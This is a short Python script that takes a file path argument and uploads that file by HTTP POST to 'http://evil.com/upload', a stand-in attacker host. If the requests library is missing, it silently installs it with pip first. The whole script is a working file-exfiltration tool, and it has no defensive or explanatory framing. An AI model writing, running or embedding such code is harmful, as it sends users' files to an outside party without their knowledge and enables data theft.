import sys,os,subprocess
try:
 import requests
except:
 subprocess.check_call([sys.executable,'-m','pip','install','requests'])
 import requests
if len(sys.argv)<2:
 print("Usage: python script.py <file>")
 sys.exit(1)
file_path=sys.argv[1]
url='http://evil.com/upload'
with open(file_path,'rb')as f:
 files={'file':f}
 r=requests.post(url,files=files)
print(r.status_code)
print(r.text)